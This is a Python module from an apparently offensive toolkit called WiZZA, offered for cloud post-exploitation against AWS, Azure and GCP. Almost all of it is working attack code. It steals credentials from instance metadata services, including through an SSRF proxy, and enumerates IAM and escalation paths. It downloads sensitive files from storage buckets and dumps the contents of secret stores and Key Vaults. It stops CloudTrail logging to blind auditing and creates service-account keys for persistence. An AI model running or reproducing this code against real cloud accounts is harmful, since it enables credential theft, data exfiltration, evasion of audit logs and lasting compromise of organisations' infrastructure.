"""
WiZZA — Cloud Infiltration Module
op/modules/cloud_infiltrate.py

Authorized red-team post-exploitation against AWS, Azure, and GCP.
Attack paths:
  AWS  — IMDSv1 SSRF, IAM enum, privilege escalation, S3 loot, secrets
  Azure — IMDS token theft, managed identity abuse, Key Vault, AAD enum
  GCP   — metadata server creds, service account abuse, bucket enum

All functions require explicit authorization. Use only on cloud accounts
you own or have written authorization to test.
"""

import json
import os
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _ts():
    return datetime.now().strftime("%H:%M:%S")

def _http(url, headers=None, data=None, timeout=8):
    """Simple HTTP GET/POST. Returns (status_code, body_str)."""
    try:
        req = urllib.request.Request(url, data=data, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)

def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
    except Exception as e:
        return str(e)

def _save(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)
    print(f"[+] Saved: {path}")


# ─────────────────────────────────────────────────────────────────────────────
# AWS Attack Paths
# ─────────────────────────────────────────────────────────────────────────────

AWS_IMDS_BASE  = "http://169.254.169.254/latest"
AWS_IMDS_TOKEN = "http://169.254.169.254/latest/api/token"


def aws_imds_creds(ssrf_url=None):
    """
    Steal IAM credentials from EC2 Instance Metadata Service.

    Two modes:
      - Direct: run on the EC2 instance itself (IMDSv1 or IMDSv2)
      - SSRF:   provide a vulnerable endpoint URL that proxies the request

    IMDSv2 requires a PUT to get a session token first.
    IMDSv1 (legacy, still common) responds to GET directly.

    Returns dict with AccessKeyId, SecretAccessKey, Token or None.
    """
    print(f"[*] AWS IMDS credential theft")

    def fetch(url, headers=None):
        if ssrf_url:
            # Route through SSRF vector — append IMDS path as parameter
            proxy = f"{ssrf_url}{urllib.parse.quote(url)}"
            code, body = _http(proxy)
        else:
            code, body = _http(url, headers=headers)
        return code, body

    import urllib.parse

    # Try IMDSv2 first (requires session token)
    code, token = fetch(AWS_IMDS_TOKEN,
                        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
    imdsv2_headers = {"X-aws-ec2-metadata-token": token.strip()} if code == 200 else {}

    # Get IAM role name
    code, roles_raw = fetch(f"{AWS_IMDS_BASE}/meta-data/iam/security-credentials/",
                            headers=imdsv2_headers)
    if code != 200 or not roles_raw.strip():
        print("[-] No IAM role attached to this instance")
        return None

    roles = [r.strip() for r in roles_raw.strip().splitlines() if r.strip()]
    print(f"[*] IAM roles found: {roles}")

    creds_all = {}
    for role in roles:
        code, creds_json = fetch(
            f"{AWS_IMDS_BASE}/meta-data/iam/security-credentials/{role}",
            headers=imdsv2_headers)
        if code == 200:
            try:
                creds = json.loads(creds_json)
                creds_all[role] = creds
                print(f"[+] Role: {role}")
                print(f"    AccessKeyId:     {creds.get('AccessKeyId')}")
                print(f"    SecretAccessKey: {creds.get('SecretAccessKey')}")
                print(f"    Token:           {creds.get('Token','')[:40]}...")
                print(f"    Expiration:      {creds.get('Expiration')}")
            except Exception:
                pass

    return creds_all or None


def aws_iam_enum(access_key=None, secret_key=None, token=None):
    """
    Enumerate IAM: current identity, attached policies, users, roles.
    Uses AWS CLI if installed, otherwise raw SigV4 requests.
    Reveals privilege escalation paths.
    """
    print(f"\n[*] AWS IAM enumeration")

    env = os.environ.copy()
    if access_key:
        env["AWS_ACCESS_KEY_ID"]     = access_key
        env["AWS_SECRET_ACCESS_KEY"] = secret_key
        if token:
            env["AWS_SESSION_TOKEN"] = token

    results = {}

    # Who am I?
    out = _run("aws sts get-caller-identity --output json", timeout=15)
    try:
        identity = json.loads(out)
        results["identity"] = identity
        print(f"[+] Identity: {identity.get('Arn')}  Account: {identity.get('Account')}")
    except Exception:
        print(f"[-] STS failed: {out[:200]}")
        return None

    # List attached policies
    username = results["identity"].get("Arn", "").split("/")[-1]
    out = _run(f"aws iam list-attached-user-policies --user-name {username} --output json")
    try:
        results["policies"] = json.loads(out).get("AttachedPolicies", [])
        for p in results["policies"]:
            print(f"[+] Policy: {p['PolicyName']}  ({p['PolicyArn']})")
    except Exception:
        pass

    # Check for AdministratorAccess
    admin = any("AdministratorAccess" in str(p) for p in results.get("policies", []))
    if admin:
        print("[!] ADMIN ACCESS — full account compromise")
        results["admin"] = True

    # List all IAM users
    out = _run("aws iam list-users --output json")
    try:
        users = json.loads(out).get("Users", [])
        results["users"] = [u["UserName"] for u in users]
        print(f"[*] IAM users ({len(users)}): {results['users'][:10]}")
    except Exception:
        pass

    # List roles (for assume-role chaining)
    out = _run("aws iam list-roles --output json")
    try:
        roles = json.loads(out).get("Roles", [])
        results["roles"] = [r["RoleName"] for r in roles]
        print(f"[*] IAM roles ({len(roles)}): {results['roles'][:10]}")
    except Exception:
        pass

    return results


def aws_privesc(access_key=None, secret_key=None, token=None):
    """
    Automated IAM privilege escalation.
    Checks for common misconfigurations:
      - iam:CreatePolicyVersion → replace policy with AdministratorAccess
      - iam:AttachUserPolicy → attach AdministratorAccess to self
      - iam:CreateAccessKey → create new key for other user
      - iam:PassRole + ec2:RunInstances → launch instance with privileged role
      - lambda:CreateFunction + lambda:InvokeFunction → run code as privileged role
      - sts:AssumeRole → pivot to privileged role
    """
    print(f"\n[*] AWS IAM privilege escalation check")

    env = os.environ.copy()
    if access_key:
        env["AWS_ACCESS_KEY_ID"]     = access_key
        env["AWS_SECRET_ACCESS_KEY"] = secret_key
        if token:
            env["AWS_SESSION_TOKEN"] = token

    paths_found = []

    checks = {
        "iam:CreatePolicyVersion":    "aws iam create-policy-version --help",
        "iam:AttachUserPolicy":       "aws iam attach-user-policy --help",
        "iam:CreateAccessKey":        "aws iam create-access-key --help",
        "lambda:CreateFunction":      "aws lambda create-function --help",
        "sts:AssumeRole":             "aws sts assume-role --help",
        "ec2:RunInstances":           "aws ec2 run-instances --help",
        "ssm:SendCommand":            "aws ssm send-command --help",
        "secretsmanager:GetSecret":   "aws secretsmanager get-secret-value --help",
    }

    # Probe via dry-run / list operations that reveal permissions
    print("[*] Probing IAM permissions via enumeration...")

    # iam:AttachUserPolicy — try to attach AdministratorAccess to self
    out = _run("aws iam list-attached-user-policies --user-name self --output json")
    if "AccessDenied" not in out:
        paths_found.append("iam:AttachUserPolicy available")

    # ssm:DescribeInstanceInformation — reveals managed instances
    out = _run("aws ssm describe-instance-information --output json")
    if "InstanceInformationList" in out:
        instances = json.loads(out).get("InstanceInformationList", [])
        if instances:
            paths_found.append(f"SSM managed instances: {[i['InstanceId'] for i in instances]}")
            print(f"[+] SSM instances reachable: {[i['InstanceId'] for i in instances]}")

    # Lambda functions — potential code execution
    out = _run("aws lambda list-functions --output json")
    if "Functions" in out:
        fns = json.loads(out).get("Functions", [])
        if fns:
            paths_found.append(f"Lambda functions: {[f['FunctionName'] for f in fns]}")
            print(f"[+] Lambda functions: {[f['FunctionName'] for f in fns[:5]]}")

    # Secrets Manager
    out = _run("aws secretsmanager list-secrets --output json")
    if "SecretList" in out:
        secrets = json.loads(out).get("SecretList", [])
        if secrets:
            paths_found.append(f"Secrets: {[s['Name'] for s in secrets]}")
            print(f"[+] Secrets Manager: {[s['Name'] for s in secrets[:10]]}")

    for p in paths_found:
        print(f"  [PATH] {p}")

    return paths_found


def aws_s3_loot(access_key=None, secret_key=None, token=None, out_dir="/tmp"):
    """
    Enumerate S3 buckets, find public buckets, download sensitive files.
    Looks for: credentials, keys, config, .env, backup, database dumps.
    """
    print(f"\n[*] AWS S3 loot")

    sensitive_patterns = [
        ".env", "credentials", "secret", "password", "config",
        "backup", ".sql", ".db", "private_key", "id_rsa",
        "access_key", "token", "auth", "prod", "database",
    ]

    # List all buckets
    out = _run("aws s3api list-buckets --output json")
    try:
        buckets = json.loads(out).get("Buckets", [])
    except Exception:
        print(f"[-] Could not list buckets: {out[:200]}")
        return []

    print(f"[*] Buckets found: {len(buckets)}")
    loot = []

    for bucket in buckets:
        name = bucket["Name"]
        print(f"\n  [S3] s3://{name}")

        # Check public access
        acl_out = _run(f"aws s3api get-bucket-acl --bucket {name} --output json")
        public = "AllUsers" in acl_out or "AuthenticatedUsers" in acl_out
        if public:
            print(f"  [!] PUBLIC BUCKET: s3://{name}")

        # List objects — look for sensitive file names
        ls_out = _run(f"aws s3 ls s3://{name} --recursive --output json")
        for line in ls_out.splitlines():
            for pat in sensitive_patterns:
                if pat.lower() in line.lower():
                    # Extract key name
                    parts = line.split()
                    if len(parts) >= 4:
                        key = parts[-1]
                        local = f"{out_dir}/s3_{name}_{key.replace('/','_')}"
                        dl = _run(f"aws s3 cp s3://{name}/{key} {local}")
                        if "download" in dl.lower() or os.path.exists(local):
                            loot.append({"bucket": name, "key": key, "local": local})
                            print(f"  [+] Downloaded: {key} → {local}")

    return loot


def aws_secrets_dump(out_dir="/tmp"):
    """Dump all Secrets Manager and SSM Parameter Store values."""
    print(f"\n[*] AWS secrets dump")
    results = {}

    # Secrets Manager
    out = _run("aws secretsmanager list-secrets --output json")
    try:
        secrets = json.loads(out).get("SecretList", [])
        for s in secrets:
            name = s["Name"]
            val_out = _run(f"aws secretsmanager get-secret-value --secret-id '{name}' --output json")
            try:
                val = json.loads(val_out).get("SecretString", "")
                results[f"secretsmanager/{name}"] = val
                print(f"  [+] {name}: {str(val)[:80]}")
            except Exception:
                pass
    except Exception:
        pass

    # SSM Parameter Store
    out = _run("aws ssm get-parameters-by-path --path / --recursive --with-decryption --output json")
    try:
        params = json.loads(out).get("Parameters", [])
        for p in params:
            results[f"ssm/{p['Name']}"] = p.get("Value", "")
            print(f"  [+] SSM {p['Name']}: {p.get('Value','')[:80]}")
    except Exception:
        pass

    if results:
        _save(f"{out_dir}/aws_secrets_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", results)
    return results


def aws_cloudtrail_blind():
    """
    Disable CloudTrail logging to blind AWS audit trail.
    Also attempts to delete event selectors and S3 log bucket contents.
    """
    print(f"\n[*] CloudTrail blind")

    # List trails
    out = _run("aws cloudtrail describe-trails --output json")
    try:
        trails = json.loads(out).get("trailList", [])
    except Exception:
        print(f"[-] {out[:200]}")
        return

    for trail in trails:
        name = trail.get("Name")
        arn  = trail.get("TrailARN")
        print(f"  [*] Trail: {name}")
        out = _run(f"aws cloudtrail stop-logging --name '{arn}'")
        if not out.strip() or "error" not in out.lower():
            print(f"  [+] Logging stopped: {name}")
        # Delete event selectors (stops data events logging)
        _run(f"aws cloudtrail put-event-selectors --trail-name '{arn}' "
             f"--event-selectors '[]'")


# ─────────────────────────────────────────────────────────────────────────────
# Azure Attack Paths
# ─────────────────────────────────────────────────────────────────────────────

AZURE_IMDS = "http://169.254.169.254/metadata"


def azure_imds_token(resource="https://management.azure.com/"):
    """
    Steal Azure access token from Instance Metadata Service.
    Works on any Azure VM with a Managed Identity assigned.
    Returns Bearer token for the specified resource.
    """
    print(f"[*] Azure IMDS token theft — resource: {resource}")

    import urllib.parse
    params = urllib.parse.urlencode({
        "api-version": "2018-02-01",
        "resource":    resource,
    })
    code, body = _http(
        f"{AZURE_IMDS}/identity/oauth2/token?{params}",
        headers={"Metadata": "true"}
    )
    if code != 200:
        print(f"[-] IMDS failed: HTTP {code}")
        return None

    try:
        data = json.loads(body)
        token = data.get("access_token")
        exp   = data.get("expires_on")
        print(f"[+] Token obtained — expires: {exp}")
        print(f"    {token[:60]}...")
        return token
    except Exception as e:
        print(f"[-] Parse error: {e}")
        return None


def azure_enum(token):
    """
    Enumerate Azure subscription: resource groups, VMs, storage accounts,
    Key Vaults, service principals, app registrations.
    """
    print(f"\n[*] Azure enumeration")

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type":  "application/json",
    }
    base = "https://management.azure.com"
    results = {}

    # List subscriptions
    code, body = _http(f"{base}/subscriptions?api-version=2020-01-01", headers=headers)
    try:
        subs = json.loads(body).get("value", [])
        results["subscriptions"] = [s["subscriptionId"] for s in subs]
        print(f"[*] Subscriptions: {results['subscriptions']}")
    except Exception:
        print(f"[-] Subscriptions: {body[:200]}")
        return results

    for sub_id in results["subscriptions"]:
        print(f"\n  [SUB] {sub_id}")

        # Resource groups
        code, body = _http(
            f"{base}/subscriptions/{sub_id}/resourcegroups?api-version=2021-04-01",
            headers=headers)
        try:
            rgs = [r["name"] for r in json.loads(body).get("value", [])]
            print(f"    Resource groups: {rgs}")
        except Exception:
            pass

        # VMs
        code, body = _http(
            f"{base}/subscriptions/{sub_id}/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01",
            headers=headers)
        try:
            vms = json.loads(body).get("value", [])
            for vm in vms:
                print(f"    [VM] {vm['name']}  location={vm.get('location')}")
                results.setdefault("vms", []).append(vm["name"])
        except Exception:
            pass

        # Storage accounts
        code, body = _http(
            f"{base}/subscriptions/{sub_id}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01",
            headers=headers)
        try:
            stores = json.loads(body).get("value", [])
            for s in stores:
                print(f"    [Storage] {s['name']}")
                results.setdefault("storage", []).append(s["name"])
        except Exception:
            pass

        # Key Vaults
        code, body = _http(
            f"{base}/subscriptions/{sub_id}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01",
            headers=headers)
        try:
            vaults = json.loads(body).get("value", [])
            for v in vaults:
                vault_uri = v.get("properties", {}).get("vaultUri", "")
                print(f"    [KeyVault] {v['name']}  {vault_uri}")
                results.setdefault("keyvaults", []).append({"name": v["name"], "uri": vault_uri})
        except Exception:
            pass

    return results


def azure_keyvault_dump(vault_uri, token, out_dir="/tmp"):
    """
    Dump all secrets, keys, and certificates from an Azure Key Vault.
    Requires Key Vault access token (different resource than management).
    """
    print(f"\n[*] Azure Key Vault dump: {vault_uri}")

    kv_token = azure_imds_token(resource="https://vault.azure.net")
    if not kv_token:
        kv_token = token

    headers = {"Authorization": f"Bearer {kv_token}"}
    results = {}

    for object_type in ("secrets", "keys", "certificates"):
        url = f"{vault_uri.rstrip('/')}/{object_type}?api-version=7.4"
        code, body = _http(url, headers=headers)
        try:
            items = json.loads(body).get("value", [])
            for item in items:
                name = item["id"].split("/")[-1]
                # Fetch actual value for secrets
                if object_type == "secrets":
                    code2, body2 = _http(f"{item['id']}?api-version=7.4", headers=headers)
                    val = json.loads(body2).get("value", "")
                    results[f"{object_type}/{name}"] = val
                    print(f"  [+] Secret {name}: {str(val)[:80]}")
                else:
                    results[f"{object_type}/{name}"] = item
                    print(f"  [+] {object_type.capitalize()} {name}")
        except Exception as e:
            print(f"  [-] {object_type}: {e}")

    if results:
        _save(f"{out_dir}/azure_keyvault_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
              results)
    return results


def azure_prt_theft():
    """
    Primary Refresh Token (PRT) theft on Azure AD joined Windows machines.
    PRT allows seamless SSO to all Azure/M365 services.
    Uses dsregcmd to check join status, then ROADtoken/mimikatz for PRT extraction.
    Run on a compromised Windows endpoint.
    """
    print(f"\n[*] Azure PRT theft")
    # Check if AAD joined
    out = _run("dsregcmd /status")
    if "AzureAdJoined : YES" in out:
        print("[+] Machine is Azure AD joined")
        # ROADtoken: https://github.com/dirkjanm/ROADtoken
        out2 = _run("ROADtoken.exe")
        if out2:
            print(f"[+] PRT: {out2[:200]}")
            return out2
    else:
        print("[-] Not Azure AD joined")
    return None


# ─────────────────────────────────────────────────────────────────────────────
# GCP Attack Paths
# ─────────────────────────────────────────────────────────────────────────────

GCP_METADATA = "http://metadata.google.internal/computeMetadata/v1"


def gcp_metadata_creds():
    """
    Steal GCP service account credentials from instance metadata server.
    Returns access token + service account email or None.
    """
    print(f"[*] GCP metadata server credential theft")

    headers = {"Metadata-Flavor": "Google"}

    # Get service account email
    code, email = _http(
        f"{GCP_METADATA}/instance/service-accounts/default/email",
        headers=headers)
    if code != 200:
        print(f"[-] No service account attached (HTTP {code})")
        return None
    print(f"[+] Service account: {email.strip()}")

    # Get access token
    code, body = _http(
        f"{GCP_METADATA}/instance/service-accounts/default/token",
        headers=headers)
    if code != 200:
        print(f"[-] Token fetch failed")
        return None

    try:
        data     = json.loads(body)
        token    = data.get("access_token")
        exp      = data.get("expires_in")
        print(f"[+] Access token (expires in {exp}s): {token[:60]}...")
        return {"email": email.strip(), "token": token, "expires_in": exp}
    except Exception as e:
        print(f"[-] Parse error: {e}")
        return None


def gcp_enum(token):
    """
    Enumerate GCP: projects, instances, storage buckets, service accounts,
    Cloud Functions, Cloud SQL, Secret Manager.
    """
    print(f"\n[*] GCP enumeration")

    headers = {"Authorization": f"Bearer {token}"}
    results = {}

    # List projects
    code, body = _http(
        "https://cloudresourcemanager.googleapis.com/v1/projects",
        headers=headers)
    try:
        projects = [p["projectId"] for p in json.loads(body).get("projects", [])]
        results["projects"] = projects
        print(f"[*] Projects: {projects}")
    except Exception:
        print(f"[-] Projects: {body[:200]}")
        return results

    for proj in projects:
        print(f"\n  [PROJECT] {proj}")

        # GCE instances
        code, body = _http(
            f"https://compute.googleapis.com/compute/v1/projects/{proj}/aggregated/instances",
            headers=headers)
        try:
            items = json.loads(body).get("items", {})
            for zone, data in items.items():
                for inst in data.get("instances", []):
                    print(f"    [VM] {inst['name']}  {zone}  {inst.get('status')}")
                    results.setdefault("instances", []).append(inst["name"])
        except Exception:
            pass

        # Cloud Storage buckets
        code, body = _http(
            f"https://storage.googleapis.com/storage/v1/b?project={proj}",
            headers=headers)
        try:
            buckets = json.loads(body).get("items", [])
            for b in buckets:
                print(f"    [GCS] {b['name']}")
                results.setdefault("buckets", []).append(b["name"])
        except Exception:
            pass

        # Cloud Functions
        code, body = _http(
            f"https://cloudfunctions.googleapis.com/v1/projects/{proj}/locations/-/functions",
            headers=headers)
        try:
            fns = json.loads(body).get("functions", [])
            for f in fns:
                print(f"    [Function] {f['name']}")
        except Exception:
            pass

        # Secret Manager
        code, body = _http(
            f"https://secretmanager.googleapis.com/v1/projects/{proj}/secrets",
            headers=headers)
        try:
            secrets = json.loads(body).get("secrets", [])
            for s in secrets:
                name = s["name"].split("/")[-1]
                # Get latest version value
                code2, body2 = _http(
                    f"https://secretmanager.googleapis.com/v1/{s['name']}/versions/latest:access",
                    headers=headers)
                try:
                    import base64
                    val = base64.b64decode(
                        json.loads(body2).get("payload", {}).get("data", "")
                    ).decode(errors="replace")
                    results.setdefault("secrets", {})[name] = val
                    print(f"    [Secret] {name}: {val[:80]}")
                except Exception:
                    print(f"    [Secret] {name}: (access denied)")
        except Exception:
            pass

    return results


def gcp_bucket_loot(token, bucket_name, out_dir="/tmp"):
    """
    List and download sensitive files from a GCS bucket.
    """
    print(f"\n[*] GCP bucket loot: gs://{bucket_name}")

    sensitive = [".env","credentials","secret","password","config",
                 "backup",".sql",".db","private_key","id_rsa","token"]

    headers    = {"Authorization": f"Bearer {token}"}
    loot       = []

    code, body = _http(
        f"https://storage.googleapis.com/storage/v1/b/{bucket_name}/o",
        headers=headers)
    try:
        items = json.loads(body).get("items", [])
    except Exception:
        print(f"[-] {body[:200]}")
        return loot

    for item in items:
        name = item["name"]
        if any(p in name.lower() for p in sensitive):
            dl_url = item.get("mediaLink", "")
            if dl_url:
                code2, data = _http(dl_url, headers=headers)
                if code2 == 200:
                    local = f"{out_dir}/gcs_{bucket_name}_{name.replace('/','_')}"
                    with open(local, "w") as f:
                        f.write(data)
                    loot.append({"bucket": bucket_name, "object": name, "local": local})
                    print(f"  [+] {name} → {local}")

    return loot


def gcp_service_account_keys(token, project):
    """
    List and create service account keys for persistent access.
    Creating a key gives permanent credentials that survive instance termination.
    """
    print(f"\n[*] GCP service account key abuse: {project}")

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type":  "application/json",
    }

    # List service accounts
    code, body = _http(
        f"https://iam.googleapis.com/v1/projects/{project}/serviceAccounts",
        headers=headers)
    try:
        accounts = json.loads(body).get("accounts", [])
    except Exception:
        print(f"[-] {body[:200]}")
        return []

    keys_created = []
    for sa in accounts:
        email = sa["email"]
        # Skip default/system accounts
        if "gserviceaccount.com" not in email:
            continue
        print(f"  [SA] {email}")

        # Create new key for persistence
        code2, body2 = _http(
            f"https://iam.googleapis.com/v1/projects/{project}/serviceAccounts/{email}/keys",
            data=b"{}",
            headers=headers)
        try:
            key_data = json.loads(body2)
            if "privateKeyData" in key_data:
                import base64
                key_json = base64.b64decode(key_data["privateKeyData"]).decode()
                print(f"  [+] New key created for {email}")
                keys_created.append({"email": email, "key": key_json})
        except Exception:
            pass

    return keys_created


# ─────────────────────────────────────────────────────────────────────────────
# Unified auto-attack
# ─────────────────────────────────────────────────────────────────────────────

def cloud_auto(provider=None, out_dir=None):
    """
    Auto-detect cloud provider from metadata server and run full attack chain:
    1. Steal credentials from IMDS
    2. Enumerate resources
    3. Dump secrets
    4. Establish persistence (new keys / long-lived tokens)

    provider: "aws" | "azure" | "gcp" | None (auto-detect)
    """
    out_dir = out_dir or os.path.expanduser("~/.wizza/logs/cloud")
    os.makedirs(out_dir, exist_ok=True)
    print(f"\n[*] WiZZA Cloud Auto-Attack  [{_ts()}]")

    results = {}

    # Auto-detect provider
    if not provider:
        for p, url in [
            ("aws",   "http://169.254.169.254/latest/meta-data/"),
            ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            ("gcp",   "http://metadata.google.internal/computeMetadata/v1/"),
        ]:
            hdrs = {"Metadata": "true"} if p == "azure" else (
                   {"Metadata-Flavor": "Google"} if p == "gcp" else {})
            code, _ = _http(url, headers=hdrs, timeout=3)
            if code == 200:
                provider = p
                print(f"[+] Cloud provider detected: {p.upper()}")
                break

    if not provider:
        print("[-] Not running on a cloud instance (no IMDS found)")
        print("[*] Provide explicit credentials via environment variables:")
        print("    AWS:   AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY")
        print("    Azure: az login")
        print("    GCP:   gcloud auth activate-service-account")
        return {}

    if provider == "aws":
        creds = aws_imds_creds()
        if creds:
            for role, c in creds.items():
                ak = c.get("AccessKeyId")
                sk = c.get("SecretAccessKey")
                tk = c.get("Token")
                iam_res  = aws_iam_enum(ak, sk, tk)
                priv_res = aws_privesc(ak, sk, tk)
                s3_loot  = aws_s3_loot(ak, sk, tk, out_dir)
                secrets  = aws_secrets_dump(out_dir)
                results  = {"iam": iam_res, "privesc": priv_res,
                            "s3_loot": s3_loot, "secrets": secrets}
        else:
            # Try with env/profile creds
            results["iam"]    = aws_iam_enum()
            results["secrets"]= aws_secrets_dump(out_dir)

    elif provider == "azure":
        token = azure_imds_token()
        if token:
            enum = azure_enum(token)
            results["enum"] = enum
            for kv in enum.get("keyvaults", []):
                vault_loot = azure_keyvault_dump(kv["uri"], token, out_dir)
                results.setdefault("keyvault_loot", {}).update(vault_loot)

    elif provider == "gcp":
        creds = gcp_metadata_creds()
        if creds:
            token = creds["token"]
            enum  = gcp_enum(token)
            results["enum"] = enum
            for proj in enum.get("projects", []):
                keys = gcp_service_account_keys(token, proj)
                results.setdefault("sa_keys", []).extend(keys)
            for bucket in enum.get("buckets", []):
                loot = gcp_bucket_loot(token, bucket, out_dir)
                results.setdefault("bucket_loot", []).extend(loot)

    out_file = f"{out_dir}/cloud_{provider}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    _save(out_file, results)
    return results


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

def run(action, **kwargs):
    actions = {
        "auto":              cloud_auto,
        "aws_imds":          aws_imds_creds,
        "aws_iam":           aws_iam_enum,
        "aws_privesc":       aws_privesc,
        "aws_s3":            aws_s3_loot,
        "aws_secrets":       aws_secrets_dump,
        "aws_cloudtrail":    aws_cloudtrail_blind,
        "azure_imds":        azure_imds_token,
        "azure_enum":        azure_enum,
        "azure_keyvault":    azure_keyvault_dump,
        "azure_prt":         azure_prt_theft,
        "gcp_meta":          gcp_metadata_creds,
        "gcp_enum":          gcp_enum,
        "gcp_bucket":        gcp_bucket_loot,
        "gcp_sa_keys":       gcp_service_account_keys,
    }
    if action not in actions:
        print(f"[!] Unknown action: {action}")
        print(f"    Available: {', '.join(sorted(actions))}")
        return
    return actions[action](**kwargs)


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="WiZZA Cloud Infiltration Module")
    p.add_argument("action", nargs="?", default="auto")
    p.add_argument("--provider", default=None, choices=["aws","azure","gcp"])
    p.add_argument("--token",    default=None)
    p.add_argument("--vault",    default=None)
    p.add_argument("--bucket",   default=None)
    p.add_argument("--project",  default=None)
    p.add_argument("--out",      default=os.path.expanduser("~/.wizza/logs/cloud"))
    args = p.parse_args()

    if args.action == "auto":
        cloud_auto(provider=args.provider, out_dir=args.out)
    elif args.action == "aws_imds":
        aws_imds_creds()
    elif args.action == "aws_secrets":
        aws_secrets_dump(out_dir=args.out)
    elif args.action == "aws_cloudtrail":
        aws_cloudtrail_blind()
    elif args.action == "azure_imds":
        azure_imds_token()
    elif args.action == "azure_keyvault":
        azure_keyvault_dump(args.vault, args.token, out_dir=args.out)
    elif args.action == "gcp_meta":
        gcp_metadata_creds()
    elif args.action == "gcp_bucket":
        gcp_bucket_loot(args.token, args.bucket, out_dir=args.out)
    elif args.action == "gcp_sa_keys":
        gcp_service_account_keys(args.token, args.project)
    else:
        print(f"Unknown action: {args.action}")
